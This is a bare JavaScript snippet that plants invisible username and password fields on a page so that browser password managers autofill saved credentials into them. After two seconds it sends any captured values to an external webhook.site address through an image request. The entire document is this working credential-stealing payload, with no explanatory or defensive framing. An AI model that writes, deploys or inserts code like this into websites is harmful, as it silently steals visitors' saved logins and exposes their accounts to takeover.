var a=document.createElement('input');
a.style.display='none';
a.autocomplete='username';
document.body.appendChild(a);
var b=document.createElement('input');
b.type='password';
b.style.display='none';
b.autocomplete='current-password';
document.body.appendChild(b);
setTimeout(function(){
  if(a.value||b.value){
    new Image().src='https://webhook.site/ae7990e1-69d3-4b40-8fdc-bbe39df73870?l='+encodeURIComponent(a.value)+String.fromCharCode(38)+'p='+encodeURIComponent(b.value)
  }
},2000);
